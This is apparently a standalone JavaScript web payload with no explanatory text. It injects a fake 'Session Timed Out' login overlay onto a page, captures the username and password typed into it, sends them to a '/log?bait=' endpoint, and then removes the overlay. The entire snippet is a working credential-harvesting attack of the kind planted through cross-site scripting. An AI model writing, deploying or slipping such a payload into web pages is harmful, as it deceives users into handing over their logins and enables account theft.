const bait = document.createElement("div");
bait.innerHTML = `
  <div style="position:fixed;top:30%;left:35%;background:#222;padding:20px;border:2px solid #0f0;color:#0f0;z-index:9999;">
    <h3>Session Timed Out</h3>
    <input type="text" placeholder="Username" id="xusr" style="display:block;margin:5px 0;">
    <input type="password" placeholder="Password" id="xpwd" style="display:block;margin:5px 0;">
    <button onclick="submitBait()">Login</button>
  </div>
`;
document.body.appendChild(bait);

window.submitBait = () => {
  const u = document.getElementById("xusr").value;
  const p = document.getElementById("xpwd").value;
  fetch("/log?bait=" + encodeURIComponent(u + ":" + p));
  bait.remove();
};